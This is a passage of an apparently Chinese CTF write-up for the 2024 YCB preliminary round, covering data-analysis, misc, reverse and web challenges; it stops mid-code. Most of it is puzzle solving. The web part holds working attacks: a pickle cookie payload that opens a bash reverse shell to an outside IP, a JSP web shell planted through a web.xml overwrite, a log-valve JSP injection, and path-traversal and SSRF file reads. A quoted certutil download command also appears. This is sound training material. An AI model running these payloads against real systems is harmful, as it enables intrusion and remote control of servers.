hanzi(value):\n            d['姓名'] = value\n        elif len(value) == 11 and value.isdigit():\n            d['手机号码'] = value\n        elif value.isdigit():\n            d['编号'] = value\n        else:\n            d['用户名'] = value\n\n    with open(\"person_data_new.csv\", \"a\", encoding='utf-8', newline='') as f:\n        f_csv = csv.writer(f)\n        f_csv.writerow(d.values())\n```\n\n\n![](/img/wp/2024/2024-ycb-c-data-analy1.png)\n\n\n\n## data-analy2\n\n与上一题类似，筛选出不符合格式的数据\n\n先从流量包中导出数据\n\n`tshark -r data.pcapng -T fields -e http.file_data -Y \"http.request\" > data.txt`\n\n```python\n# encoding: utf-8\nimport csv\nimport json\nimport pandas as pd\n\nf = open('data.txt')\ne = [bytes.fromhex(i) for i in f.read().splitlines()]\nf.close()\n\nd = []\nfor i in e:\n    if i.strip():\n        d.append(i)\ne = b'[' + b','.join(d) + b']'\n\nd = json.loads(e)\n\n# l = {'username': '', 'name': '', 'sex': '', 'birth': '', 'idcard': '', 'phone': ''}\n\n\nimport os\n\nif os.path.exists('data.csv'):\n    os.remove('data.csv')\n\nf = open('data.csv', 'w', encoding=\"utf-8\", newline='')\nf_csv = csv.writer(f)\nf_csv.writerow(d[0].keys())\n\nphum = [734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778, 782, 783, 784, 787, 788, 795,\n        798, 730, 731, 732, 740, 745, 746, 755, 756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774,\n        777, 780, 781, 789, 790, 791, 793, 799]\n\n\ndef check(data):\n    # 将data前17位数字分别乘以不同的系数。从第⼀位到第⼗七位的系数分别是： 7, 9, 10 , 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2\n    # 将这17位数字和系数相乘的结果相加。\n    # 用加出来和除以11，得到余数\n    # 余数的结果对应的数字即为第18位数字。如果余数是2，那么第18位数字就是x\n\n    data = data[:-1]\n    data = list(map(int, data))\n    xi = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]\n    sum = 0\n    for i in range(17):\n        sum += xi[i] * int(data[i])\n    sum %= 11\n\n    if sum == 0:\n        data.append(str(1))\n    elif sum == 1:\n        data.append(str(0))\n    elif sum == 2:\n        data.append('X')\n    else:\n        data.append(str(12 - sum))\n    return data[-1]\n\n\nfor i in d:\n    for key, value in i.items():\n        if key == 'username':\n            if not value.isalnum():\n                print(\"username: \" + str(i))\n                f_csv.writerow(i.values())\n                break\n\n        if key == 'name':\n            if not all('\\u4e00' <= char <= '\\u9fa5' for char in value):\n                print(\"name: \" + str(i))\n                f_csv.writerow(i.values())\n                break\n\n        if key == 'idcard':\n            if len(value) != 18 or not value[:-1].isdigit() or value[-1] not in '0123456789X' or value[-1] != check(\n                    value):\n                print(\"idcard: \" + str(i))\n                f_csv.writerow(i.values())\n                break\n\n        if key == 'sex':\n            if value not in ['男', '女'] or (value == '男' and i['idcard'][16] not in '13579') or (\n                    value == '女' and i['idcard'][16] not in '02468'):\n                print(\"sex: \" + str(i))\n                f_csv.writerow(i.values())\n                break\n\n        if key == 'birth':\n            if len(value) != 8 or not value.isdigit() or value != i['idcard'][6:14] or int(value[:4]) not in range(1900,\n                                                                                                                   2021) or int(\n                value[4:6]) not in range(1, 13) or int(value[6:]) not in range(1, 32):\n                print(\"birth: \" + str(i))\n                f_csv.writerow(i.values())\n                break\n\n        if key == 'phone':\n            if len(value) != 11 or not value.isdigit() or int(value[:3]) not in phum:\n                print(\"phone: \" + str(i))\n                f_csv.writerow(i.values())\n                break\n\n```\n\n![](/img/wp/2024/2024-ycb-c-data-analy2.png)\n\n\n## data-analy3\n\n给了三个日志文件，只有`error.log`有数据\n\n部分校验与第二题类似，多了一个脱敏\n\n```python\nimport hashlib\nimport re\nfrom urllib import parse\n\n\n# 数据脱敏函数\ndef check(data, flag):\n    # username\n    if flag == 1:\n        if len(data) == 2:\n            return data[0] + '*'\n        else:\n            return data[0] + '*' * (len(data) - 2) + data[-1]\n    # password\n    elif flag == 2:\n        return hashlib.md5(data.encode()).hexdigest()\n    # name\n    elif flag == 3:\n        pattern = re.compile(r'[\\u4e00-\\u9fa5]+')\n        match = pattern.findall(data)\n        if len(match[0]) != len(data):\n            raise Exception()\n        if len(match[0]) == 2:\n            return match[0][0] + '*'\n        else:\n            return match[0][0] + '*' * (len(match[0]) - 2) + match[0][-1]\n    # idcard\n    elif flag == 4:\n        # 只显示年份\n        return '*' * 6 + data[6:10] + '*' * 8\n    # phone\n    elif flag == 5:\n        return data[:3] + '*' * 4 + data[-4:]\n\n\n# 身份证校验\ndef sfz_check(data):\n    data = data[:-1]\n    data = list(map(int, data))\n    xi = [7, 9, 10, 5, 8, 4, 2, 1, 6, 3, 7, 9, 10, 5, 8, 4, 2]\n    sum = 0\n    for i in range(17):\n        sum += xi[i] * int(data[i])\n    sum %= 11\n\n    if sum == 0:\n        data.append(str(1))\n    elif sum == 1:\n        data.append(str(0))\n    elif sum == 2:\n        data.append('X')\n    else:\n        data.append(str(12 - sum))\n    return data[-1]\n\n\nwith open('error.log', 'rb') as f:\n    data = f.readlines()\n\npattern = re.compile(r'username=(.*?)&name=(.*?)&idcard=(.*?)&phone=(.+)')\npattern2 = re.compile(\n    r': ([\\w\\d]+?)\\\\n')\n\nphum = [734, 735, 736, 737, 738, 739, 747, 748, 750, 751, 752, 757, 758, 759, 772, 778, 782, 783, 784, 787, 788, 795,\n        798, 730, 731, 732, 740, 745, 746, 755, 756, 766, 767, 771, 775, 776, 785, 786, 796, 733, 749, 753, 773, 774,\n        777, 780, 781, 789, 790, 791, 793, 799]\n\n\nds = []\ni = 0\nwhile i < len(data):\n    match = pattern.findall(parse.unquote(data[i].decode()))\n    if match:\n        passwddata = b''.join(data[i:i + 10]).decode()\n        passwd = pattern2.search(passwddata)\n        if passwd:\n            try:\n                if sfz_check(match[0][2]) != match[0][2][-1]:\n                    raise Exception()\n                if int(match[0][3][0:3]) not in phum:\n                    raise Exception()\n                if not match[0][0].isalnum():\n                    raise Exception()\n                d = {'username': check(match[0][0], 1), 'password': check(passwd.groups()[0], 2),\n                     'name': check(match[0][1], 3), 'idcard': check(match[0][2], 4),\n                     'phone': check(match[0][3], 5)}\n                ds.append(d)\n            except:\n                pass\n        i += 10\n    i += 1\n\n# print(ds)\n\n\nwith open('example.csv', 'w', encoding='utf-8') as f:\n    f.write('username,password,name,idcard,phone\\n')\n    for d in ds:\n        f.write(','.join(d.values()) + '\\n')\n```\n\n![](/img/wp/2024/2024-ycb-c-data-analy3.png)\n\n\n# [初赛] misc\n\n## hiden\n\n文件名提示 `60=()+().txt`\n先rot47在rot13\n\n得到加密脚本\n\n```python\nimport wave\n\nwith open('flag.txt', 'rb') as f:\n    txt_data = f.read()\n    file_len = len(txt_data)\n    txt_data = file_len.to_bytes(3, byteorder='little') + txt_data\n\nwith wave.open(\"test.wav\", \"rb\") as f:\n    attrib = f.getparams()\n    wav_data = bytearray(f.readframes(-1))\n\nfor index in range(len(txt_data)):\n    wav_data[index * 4] = txt_data[index]\n\nwith wave.open(\"hiden.wav\", \"wb\") as f:\n    f.setparams(attrib)\n    f.writeframes(wav_data)\n```\n\n\n解密脚本\n\n```python\nimport wave\n\nwith wave.open(\"hiden.wav\", \"rb\") as f:\n    wav_data = bytearray(f.readframes(-1))\n\ntxt_data = bytearray()\nfor index in range(0, len(wav_data), 4):\n    txt_data.append(wav_data[index])\n\nfile_len = int.from_bytes(txt_data[:3], byteorder='little')\noriginal_data = txt_data[3:file_len + 3]\n\nprint(original_data.decode())\n```\n\n\n## 不一样的数据库_2\n\n纯数字暴力破解，得到压缩包密码`753951`\n\n二维码画上定位符扫码得到`NRF@WQUKTQ12345&WWWF@WWWFX#WWQXNWXNU`\n\n![](/img/wp/2024/2024-ycb-c-不一样的数据库_2-1.png)\n\nrot13得到`AES@JDHXGD12345&JJJS@JJJSK#JJDKAJKAH`\n\n压缩包中的另一个文件`Kee.kdbx`百度可知用keepass打开，密码就是二维码解密的内容\n\n![](/img/wp/2024/2024-ycb-c-不一样的数据库_2-2.png)\n\n打开后查看历史修改记录，得到一串加密字符串，和提示aes\n\n![](/img/wp/2024/2024-ycb-c-不一样的数据库_2-3.png)\n\naes的密码就是打开软件后出现的`DASCTF`\n\n![](/img/wp/2024/2024-ycb-c-不一样的数据库_2-4.png)\n\n![](/img/wp/2024/2024-ycb-c-不一样的数据库_2-5.png)\n\n\n## so much\n\n打开题目，给了一个`c2hpZnQh.ad1`的磁盘文件\n\n文件尾存在额外数据：`the key is: 1234567   really?`\n\n将文件名base64解码得到`shift!`\n\n\n使用ftk的`Decrypt AD1 image`对附件解密，密码是1234567加上shift，即`!@#$%^&`\n\n解密后继续用ftk挂载到磁盘上，发现存在344个`.crypto`文件\n\n![](/img/wp/2024/2024-ycb-c-so-much-1.png)\n\n\n同时，文件的时间只有`2021/8/5 16:19`和`2021/8/5 16:20`\n\n对秒数进行操作\n\n```python\nimport os\n\n# 获取344个文件的时间\ntime = [''] * 344\nfor j in range(344):\n    time[j] = os.path.getmtime('S:\\\\' + str(j) + '.crypto')\n\n\n# 按顺序转换成0和1\nkey = ''\nfor i in range(344):\n    if str(time[i]) == '1628151585.73009':\n        key += '0'\n    else:\n        key += '1'\n\n\n# 344刚好可以整除8，转成字符串\nkey = [key[i:i+8] for i in range(0, len(key), 8)]\nkey = ''.join([chr(int(i, 2)) for i in key])\nprint(key)\n\n```\n\n得到`the_key_is_700229c053b4ebbcf1a3cc37c389c4fa`\n\n\n使用`Encrypto`对两个时间不一样的文件解密即可\n\n![](/img/wp/2024/2024-ycb-c-so-much-2.png)\n\n拼接在一起得到flag\n\n![](/img/wp/2024/2024-ycb-c-so-much-3.png)\n\n\n## miaoro\n\n打开流量包筛选http流量\n\n根据返回值的特征`$$$xxxxxxxx$$$`和攻击请求头中的`Cookie`和`GWHT`字段可以判断出是shiro反序列化攻击的流量\n\n将Cookie中的内容进行枚举爆破，得到flag1 `DASCTF{B916CFEB-C40F-45D6-A7BC-`\n\n![](/img/wp/2024/2024-ycb-c-miaoro-1.png)\n\n\n其中有两条请求base64解码后的命令为\n\n`echo Th15_11111111s_pP@sssssw000rd!!!>pass.txt`\n`certutil -urlcache -f \"http://192.168.1.3:801/secret.txt\"`\n\n将secret.txt的数据导出\n\n发现结尾是`036009000414030b405`，写脚本逆序并反转字节\n\n```python\n# python2\nf = open('data.data', 'rb')\nd = f.read()\ne = \"\"\nfor i in d:\n    c = ord(i)\n    e += chr(((c & 0xf) << 4) + (c >> 4))\nf = open('data.zip', 'wb')\nf.write(e[::-1])\n```\n\n使用上面的密码解压得到flag2.jpg\n\n画面明显被分割了，尝试修改高宽\n\n![](/img/wp/2024/2024-ycb-c-miaoro-2.png)\n\n![](/img/wp/2024/2024-ycb-c-miaoro-3.png)\n\n网上找一个字母表对应后得到`EBOFDELQDIAA}`\n\n\n## Check in\n\n附件压缩包中的注释base58解码得到`Welcome2GZ`\n\n根据提示用wbs43open解txt隐写\n\n![](/img/wp/2024/2024-ycb-c-Check-in-1.png)\n\n解出得到一个log文件，是TLS的密钥log，导入到wireshark中\n\n![](/img/wp/2024/2024-ycb-c-Check-in-2.png)\n\n\n将附件txt内容转成pcapng后打开后发现上传了一个flag.gif\n\n![](/img/wp/2024/2024-ycb-c-Check-in-3.png)\n\n\n使用identify分析，发现gif每帧的间隔时间在3和23转换\n\n```text\nidentify -format \"%T, \" 1.gif\n3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 3, 3, 23, 23, 23, 3, 23, 23, 23, 3, 23, 3, 3, 23, 23, 23, 3, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 23, 3, 23, 3, 23, 3, 23, 3, 3\n```\n\n将23转成1，3转成0后转字符串\n\n```python\na = [3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 3, 3, 23, 23, 23, 3, 23, 23, 23, 3, 23, 3, 3, 23, 23, 23, 3, 3, 23, 3, 23, 23, 23, 23, 23, 3, 3, 23, 23, 3, 3, 3, 23, 3, 23, 3, 23, 3, 23, 3, 3]\n\na = [1 if x == 23 else 0 for x in a]\n\nbinary_string = ''.join(map(str, a))\n\nchars = [chr(int(binary_string[i:i+8], 2)) for i in range(0, len(binary_string), 8)]\nresult = ''.join(chars)\nprint(result)\n\n# U_0wN_1T\n```\n\n\n\n\n\n## 1z_misc\n\n\n```text\n天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。\n若女可为11，可为1124......觜可为91，亦可为725......如此往复，周而复始。\n祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16]\n```\n\n结合例子和hint的图片可以得知\n\n将数字拆成两部分\n\n第一部分从子开始数，比如1就是子，4就是卯，10就是酉。。。。\n第二部分的数字表述对应星宿的位置（格子中从右往左逆时针数），比如子的1就是女，卯的3就是心\n\n\n![](/img/wp/2024/2024-ycb-c-1z_misc-1.png)\n\n将题目给的数组转成对应的文字\n\n```text\n心,胃,心,奎,奎,心,奎,心,胃,心,心,心,胃,心,心,胃,心,奎,奎,奎,奎,胃,奎,心,奎,奎,胃,奎,心,奎,心,奎,奎\n```\n\n只有三种文字，将心替换成`.` 胃替换成`/` 奎替换成`-`\n\n解摩斯得到密码`E@SI1Y!`\n\n![](/img/wp/2024/2024-ycb-c-1z_misc-2.png)\n\n\n解压后看flag文件尾，符合lyra文件特征，同时hint.jpg中的天琴座也表明是lyra\n\n`bazel-bin/lyra/cli_example/decoder_main --encoded_path=flag.lyra --output_dir=./ --bitrate=3200`\n\n\n得到一段wav\n\n![](/img/wp/2024/2024-ycb-c-1z_misc-3.png)\n\n在线[语音转文本](https://www.luyinzhushou.com/voice2text/)（语速有点快，可以au降速后去识别）后，得到一段社会主义编码，解码得到flag\n\n![](/img/wp/2024/2024-ycb-c-1z_misc-4.png)\n\n\n# [初赛] reverse\n\n## pic\n\n爆破五位十六进制得到rc4密钥\n\n```python\nimport os\n\nfrom mcrypt import *\n\nclass rc4():\n    def toBytes(self,data):\n        if type(data)==str:\n            return data.encode()\n        elif type(data)==bytes:\n            return data\n        else:\n            raise Exception(\"data Type Error\")\n\n    def GetKey(self,data):\n        k=[]\n        k1=[]\n        data_l=len(data)\n        for i in range(256):\n            k.append(i)\n            a=\"adsf\"\n\n            k1.append(data[i%data_l])\n        n=0\n        for i in range(256):\n            n=(k1[i]+n+k[i])&0xff\n            n1=k[i]\n            k[i]=k[n]\n            k[n]=n1\n        return k\n\n    def Cipher(self,data):\n        data=self.toBytes(data)\n        enc=[]\n        k=self.Key.copy()\n        n=0\n        n1=0\n        tmp=0\n        for i in range(len(data)):\n            n=(n+1)&0xff\n            n1=(n1+k[n])&0xff\n            tmp=k[n]\n            k[n]=k[n1]\n            k[n1]=tmp\n            enc.append(data[i]^0x11^k[(k[n]+k[n1])%256])\n        return bytes(enc)\n\n\n    def __init__(self,key):\n        key=self.toBytes(key)\n        self.Key=self.GetKey(key)\n        self.__Key=key\n\n    def SetKey(self,key):\n        key=self.toBytes(key)\n        self.Key=self.GetKey(key)\n        self.__Key=key\n\nbase_=b\"0123456789abcdef\"\ndata=[0x85,0x43,0x72,0x78,0x26]\nfor i in Gendic(base_,5,True):\n    e=[i[1]^j for j in data]\n    # print(i)\n    # print(e)\n    r=rc4(bytes(i))\n    d=r.Cipher(bytes(e))\n    if d==b'\\x89\\x50\\x4e\\x47\\x0d':\n        print(i)\n        break\n```\n\n![](/img/wp/2024/2024-ycb-c-pic-1.png)\n\n\n## 你这主函数保真么\n\n离散余弦变换DCT，套模板代码\n\n```python\nimport numpy as np\n\ndef idct(dct_data):\n    N = len(dct_data)\n    result = np.zeros(N)\n\n    for n in range(N):\n        sum_value = 0.0\n        for k in range(N):\n            cos_term = np.cos((k * 3.14159265 * (n + 0.5)) / N)\n            if k == 0:\n                sum_value += dct_data[k] * np.sqrt(1.0 / N) * cos_term\n            else:\n                sum_value += dct_data[k] * np.sqrt(2.0 / N) * cos_term\n        result[n] = sum_value\n\n    return result\n\ndef decrypt_to_ascii(dct_data):\n    decrypted_data = idct(dct_data)\n    int_data = np.rint(decrypted_data).astype(int)\n    char_data = [chr(num) for num in int_data]\n    return ''.join(char_data)\n\nencrypted_data = [513.355,\n  -37.7986,\n  8.7316,\n  -10.7832,\n  -1.3097,\n  -20.5779,\n  6.98641,\n  -29.2989,\n  15.9422,\n  21.4138,\n  29.4754,\n  -2.77161,\n  -6.58794,\n  -4.22332,\n  -7.20771,\n  8.83506,\n  -4.38138,\n  -19.3898,\n  18.3453,\n  6.88259,\n  -14.7652,\n  14.6102,\n  24.7414,\n  -11.6222,\n  -9.754759999999999,\n  12.2424,\n  13.4343,\n  -34.9307,\n  -35.735,\n  -20.0848,\n  39.689,\n  21.879,\n  26.8296]\n\ndecrypted_message = decrypt_to_ascii(encrypted_data)\n\nprint(decrypted_message)\n#QNFPGS{Ju0_1f_Zn1a_@aq_ShaaL_Qpg}\n```\n\n在进行一次rot13\n\n`DASCTF{Wh0_1s_Ma1n_@nd_FunnY_Dct}`\n\n\n## docCrack\n\n用微步云沙箱进行分析，可以看到 vba 宏代码，且释放了一个二进制文件\n\n![](/img/wp/2024/2024-ycb-c-docCrack-1.png)\n\n\n通过样本提取把最后一个释放的 temp 文件进行提取，再进行 base64 解密后，就是一个二进制文件，且加密就一处\n\n```c\nfor ( j = 0; j < (int)j_strlen(argv[1]) && (unsigned __int64)j < 0x36; ++j )\n      v10[j + 64] = argv[1][j] << 6;\n```\n\n在 vba 宏代码处，还存在一个加密\n\n```vb\nFor i = 1 To Len(inflag) res = Chr(Asc(Mid(inflag, i, 1)) Xor 7) Result = Result\n```\n\n直接提取密文解密\n\n```python\nv10 = list(range(54))\nv10[0] = 4288;\nv10[1] = 4480;\nv10[2] = 5376;\nv10[3] = 4352;\nv10[4] = 5312;\nv10[5] = 4160;\nv10[6] = 7936;\nv10[7] = 5184;\nv10[8] = 6464;\nv10[9] = 6528;\nv10[10] = 5632;\nv10[11] = 3456;\nv10[12] = 7424;\nv10[13] = 5632;\nv10[14] = 6336;\nv10[15] = 6528;\nv10[16] = 6720;\nv10[17] = 6144;\nv10[18] = 6272;\nv10[19] = 7488;\nv10[20] = 6656;\nv10[21] = 7296;\nv10[22] = 7424;\nv10[23] = 2432;\nv10[24] = 2432;\nv10[25] = 2432;\nv10[26] = 5632;\nv10[27] = 4416;\nv10[28] = 3456;\nv10[29] = 7168;\nv10[30] = 6528;\nv10[31] = 7488;\nv10[32] = 6272;\nv10[33] = 5632;\nv10[34] = 3520;\nv10[35] = 6208;\nv10[36] = 5632;\nv10[37] = 4736;\nv10[38] = 6528;\nv10[39] = 6400;\nv10[40] = 7488;\nv10[41] = 3520;\nv10[42] = 5632;\nv10[43] = 5184;\nv10[44] = 3456;\nv10[45] = 7488;\nv10[46] = 7296;\nv10[47] = 3200;\nv10[48] = 6272;\nv10[49] = 0x1D00;\nv10[50] = 0x980;\nv10[51] = 0x980;\nv10[52] = 0x980;\nv10[53] = 0x1E80;\n\nfor i,v in enumerate(v10):\n    value=v;\n    value = chr((value >> 6)^7)\n    print(value, end='')\n```\n\n`DASCTF{Vba_1s_dangerous!!!_B1ware_0f_Macr0_V1ru5es!!!}`\n\n\n\n\n# [初赛] web\n\n## Lyrics For You\n\n`lyrics?lyrics=../app.py`\n\n任意文件读取得到源码\n\n```python\nimport os\nimport random\n\nfrom config.secret_key import secret_code\nfrom flask import Flask, make_response, request, render_template\nfrom cookie import set_cookie, cookie_check, get_cookie\nimport pickle\n\napp = Flask(__name__)\napp.secret_key = random.randbytes(16)\n\n\nclass UserData:\n    def __init__(self, username):\n        self.username = username\n\n\ndef Waf(data):\n    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']\n    valid = False\n    for word in blacklist:\n        if word.lower() in data.lower():\n            valid = True\n            break\n    return valid\n\n\n@app.route(\"/\", methods=['GET'])\ndef index():\n    return render_template('index.html')\n\n\n@app.route(\"/lyrics\", methods=['GET'])\ndef lyrics():\n    resp = make_response()\n    resp.headers[\"Content-Type\"] = 'text/plain; charset=UTF-8'\n    query = request.args.get(\"lyrics\")\n    path = os.path.join(os.getcwd() + \"/lyrics\", query)\n\n    try:\n        with open(path) as f:\n            res = f.read()\n    except Exception as e:\n        return \"No lyrics found\"\n    return res\n\n\n@app.route(\"/login\", methods=['POST', 'GET'])\ndef login():\n    if request.method == 'POST':\n        username = request.form[\"username\"]\n        user = UserData(username)\n        res = {\"username\": user.username}\n        return set_cookie(\"user\", res, secret=secret_code)\n    return render_template('login.html')\n\n\n@app.route(\"/board\", methods=['GET'])\ndef board():\n    invalid = cookie_check(\"user\", secret=secret_code)\n    if invalid:\n        return \"Nope, invalid code get out!\"\n\n    data = get_cookie(\"user\", secret=secret_code)\n\n    if isinstance(data, bytes):\n        a = pickle.loads(data)\n        data = str(data, encoding=\"utf-8\")\n\n    if \"username\" not in data:\n        return render_template('user.html', name=\"guest\")\n    if data[\"username\"] == \"admin\":\n        return render_template('admin.html', name=data[\"username\"])\n    if data[\"username\"] != \"admin\":\n        return render_template('user.html', name=data[\"username\"])\n\n\nif __name__ == \"__main__\":\n    os.chdir(os.path.dirname(__file__))\n    app.run(host=\"0.0.0.0\", port=8080)\n```\n\n导入了`config.secret_key`和`cookie`，通过任意文件读取再次拿到源码\n\n```python\nsecret_code = \"EnjoyThePlayTime123456\"\n```\n\n\n```python\nimport base64\nimport hashlib\nimport hmac\nimport pickle\n\nfrom flask import make_response, request\n\nunicode = str\nbasestring = str\n\n\n# Quoted from python bottle template, thanks :D\n\ndef cookie_encode(data, key):\n    msg = base64.b64encode(pickle.dumps(data, -1))\n    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())\n    return tob('!') + sig + tob('?') + msg\n\n\ndef cookie_decode(data, key):\n    data = tob(data)\n    if cookie_is_encoded(data):\n        sig, msg = data.split(tob('?'), 1)\n        if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):\n            return pickle.loads(base64.b64decode(msg))\n    return None\n\n\ndef waf(data):\n    blacklist = [b'R', b'secret', b'eval', b'file', b'compile', b'open', b'os.popen']\n    valid = False\n    for word in blacklist:\n        if word in data:\n            valid = True\n            # print(word)\n            break\n    return valid\n\n\ndef cookie_check(key, secret=None):\n    a = request.cookies.get(key)\n    data = tob(request.cookies.get(key))\n    if data:\n        if cookie_is_encoded(data):\n            sig, msg = data.split(tob('?'), 1)\n            if _lscmp(sig[1:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):\n                res = base64.b64decode(msg)\n                if waf(res):\n                    return True\n                else:\n                    return False\n        return True\n    else:\n        return False\n\n\ndef tob(s, enc='utf8'):\n    return s.encode(enc) if isinstance(s, unicode) else bytes(s)\n\n\ndef get_cookie(key, default=None, secret=None):\n    value = request.cookies.get(key)\n    if secret and value:\n        dec = cookie_decode(value, secret)\n        return dec[1] if dec and dec[0] == key else default\n    return value or default\n\n\ndef cookie_is_encoded(data):\n    return bool(data.startswith(tob('!')) and tob('?') in data)\n\n\ndef _lscmp(a, b):\n    return not sum(0 if x == y else 1 for x, y in zip(a, b)) and len(a) == len(b)\n\n\ndef set_cookie(name, value, secret=None, **options):\n    if secret:\n        value = touni(cookie_encode((name, value), secret))\n        resp = make_response(\"success\")\n        resp.set_cookie(\"user\", value, max_age=3600)\n        return resp\n    elif not isinstance(value, basestring):\n        raise TypeError('Secret key missing for non-string Cookie.')\n\n    if len(value) > 4096:\n        raise ValueError('Cookie value to long.')\n\n\ndef touni(s, enc='utf8', err='strict'):\n    return s.decode(enc, err) if isinstance(s, bytes) else unicode(s)\n```\n\n\n其中`/board`路由会读取cookie，并进行一次`pickle.loads`\n\n在本地制作一个cookie后复制到靶机即可实现pickle反序列化\n\nwaf很宽松，约等于没有，使用i执行反弹shell即可\n\n```python\nimport cookie\nfrom flask import Flask\n\nsecret_code = \"EnjoyThePlayTime123456\"\napp = Flask(__name__)\npayload = b'''(S'bash -c \"bash -i >& /dev/tcp/47.99.77.52/8888 0>&1\"'\nios\nsystem\n.'''\n\n\n@app.route(\"/\")\ndef index():\n    return cookie.set_cookie(\"user\", payload, secret=secret_code)\n\n\nif __name__ == '__main__':\n    app.run()\n```\n\n![](/img/wp/2024/2024-ycb-c-Lyrics-For-You-1.png)\n\n\n## tomtom2\n\n题目给了一个只能读xml文件的接口\n\n那就去读tomcat的配置文件\n\n`/myapp/read?filename=conf/tomcat-users.xml`\n\n\ntomcat-users中存在后台账号密码\n\n```xml\n<user username=\"admin\" password=\"This_is_my_favorite_passwd\" roles=\"manager-gui\"/>\n```\n\n\n登录后有一个文件上传，测试后发现只能上传xml文件，同时上传的`path`参数是可控的\n\n那么可以覆盖靶机的`WEB-INF/web.xml`文件来自定义一个Servlet\n\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<web-app xmlns=\"http://xmlns.jcp.org/xml/ns/javaee\"\n         xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n         xsi:schemaLocation=\"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\"\n         version=\"4.0\">\n  <servlet>\n    <servlet-name>shell</servlet-name>\n    <jsp-file>/WEB-INF/1.xml</jsp-file>\n    <load-on-startup>1</load-on-startup>\n  </servlet>\n  <servlet-mapping>\n    <servlet-name>shell</servlet-name>\n    <url-pattern>/shell</url-pattern>\n  </servlet-mapping>\n</web-app>\n```\n\n![](/img/wp/2024//2024-ycb-c-tomtom2-1.png)\n\n然后再传一个1.xml小马\n\n```jsp\n<%@ page language=\"java\" import=\"java.util.*,java.io.*\" pageEncoding=\"UTF-8\"%>\n<%!public static String excuteCmd(String c)\n{\n    StringBuilder line = new StringBuilder();\ntry\n{\n    Process pro = Runtime.getRuntime().exec(c);\n    BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));\n    String temp = null;\n    while ((temp = buf.readLine()) != null)\n    {\n        line.append(temp+\"\\\\n\");\n    }\n    buf.close();\n}\ncatch (Exception e)\n{\n    line.append(e.getMessage());\n}\nreturn line.toString();\n}\n%>\n<%\nif(\"023\".equals(request.getParameter(\"pwd\"))&&!\"\".equals(request.getParameter(\"cmd\")))\n{\n    out.println(\"<pre>\"+excuteCmd(request.getParameter(\"cmd\"))+\"</pre>\");\n}\nelse\n{\n    out.println(\":-)\");\n}\n%>\n```\n\n![](/img/wp/2024//2024-ycb-c-tomtom2-2.png)\n\n\n然后访问`/myapp/shell`即可rce\n\n![](/img/wp/2024//2024-ycb-c-tomtom2-3.png)\n\n\n## tomtom2_revenge\n\n前面和tomtom2一样，只是不能上传web.xml了，但还能上传其他xml，这样可以传一份context.xml\n\n通过设置日志路径来写入jsp文件\n\n![](/img/wp/2024/2024-ycb-c-tomtom2_revenge-1.png)\n\n\n修改下得到\n\n```xml\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<Context>\n    <Valve className=\"org.apache.catalina.valves.AccessLogValve\" directory=\"/opt/tomcat/webapps/myapp/\" prefix=\"log\" suffix=\".jsp\" pattern=\"%{User-Agent}i\" resolveHosts=\"false\" />\n</Context>\n```\n\n然后上传，这里要注意上传到META-INF目录中，而不是WEB-INF目录\n\n再访问一次，User-Agent中带上jsp代码即可\n\n```\nGET /myapp/upload.html HTTP/1.1\nHost: 139.155.126.78:31506\nPragma: no-cache\nCache-Control: no-cache\nUpgrade-Insecure-Requests: 1\nUser-Agent: <%= new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[0])).getInputStream()).useDelimiter(request.getParameter(request.getParameterMap().keySet().toArray(new String[0])[1])).next() %>\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://139.155.126.78:31506/myapp/login.html\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\nCookie: JSESSIONID=1C384267B4E8256CC990EE792436ECBA\nConnection: keep-alive\n\n\n```\n\n\n然后请求`/myapp/log.2024-08-28.jsp?cmd=ls&1=%5CA`\n\n![](/img/wp/2024/2024-ycb-c-tomtom2_revenge-2.png)\n\n\n\n## 网络照相馆\n\nssrf拿到源码\n\n`file://localhost/var/www/html/url.php`\n\n```php\n<?php\n//error_reporting(0);\ninclude_once 'function.php';\ninclude_once 'sql.php';\n\n$baseDir = \"data/\";\n\nif(isset($_POST['url']))\n{\n    $url = $_POST['url'];\n    $parse = parse_url($url);\n    if(!isset($parse['host']))\n    {\n        die(\"url错误！\");\n    }\n    $data = curl($url);\n    $filename = $baseDir .  get_filename(8);\n    file_put_contents($filename , $data);\n    if (check($conn, $filename, $url)){\n        file_put_contents($filename , $data);\n        $sql = \"INSERT INTO `data`(`url`,`filename`) VALUES (?, ?)\";\n        if($stmt = mysqli_prepare($conn, $sql)){\n            mysqli_stmt_bind_param($stmt, \"ss\", $url, $filename);\n            mysqli_stmt_execute($stmt);\n        }\n    }\n    else{\n        unlink($filename);\n    }\n    echo $data;\n}\n?>\n```\n\n`file://localhost/var/www/html/function.php`\n\n```php\n<?php\n\nfunction curl($url){\n    $curl = curl_init();\n    curl_setopt($curl, 